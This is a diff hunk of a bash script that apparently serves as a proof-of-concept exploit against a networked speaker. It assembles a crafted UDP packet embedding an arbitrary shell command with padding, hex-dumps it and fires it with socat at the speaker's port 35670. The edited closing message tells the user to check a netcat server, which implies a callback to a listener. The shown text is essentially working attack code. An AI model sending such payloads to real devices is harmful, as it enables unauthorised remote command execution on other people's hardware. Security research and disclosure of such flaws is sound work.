@@ -34,6 +34,6 @@ echo "UDP PAYLOAD:"
 echo -n -e '\x13\00\00\00\00\00\00\00\x94\00\00\00/'${COMMAND}'/\00'$(for x in $(seq 1 $((125 - ${#COMMAND}))) ; do echo -n -e a ; done)'ignored\00' | xxd
 echo -n -e '\x13\00\00\00\00\00\00\00\x94\00\00\00/'${COMMAND}'/\00'$(for x in $(seq 1 $((125 - ${#COMMAND}))) ; do echo -n -e a ; done)'ignored\00' | socat - udp4:$SPEAKER_IP:35670
 
-echo "Done"
-
+echo "Payload sent... check netcat server"
 echo
+
